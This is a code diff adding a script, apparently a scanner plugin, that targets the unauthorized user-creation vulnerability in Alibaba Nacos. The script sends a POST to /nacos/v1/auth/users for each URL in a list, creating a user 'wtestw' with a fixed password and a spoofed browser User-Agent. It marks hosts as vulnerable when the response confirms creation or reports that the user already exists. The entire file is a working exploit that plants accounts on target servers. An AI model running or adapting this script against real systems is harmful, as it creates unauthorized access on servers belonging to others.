@@ -1,0 +1,30 @@
+#request urls = array
+#define payload = /nacos/v1/auth/users
+#define bug = create user ok!
+#define bug2 = already exist!
+#define info = Alibaba Nacos 未授权创建用户访问漏洞
+#define post = username=wtestw&password=wtestw
+
+function main(args)
+{
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,post,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}else{
+				if(StrFindStr(res[0],bug2,0)!= "-1")
+				{
+					printclolor("[+]".urls[i].info,3);
+				}
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+}
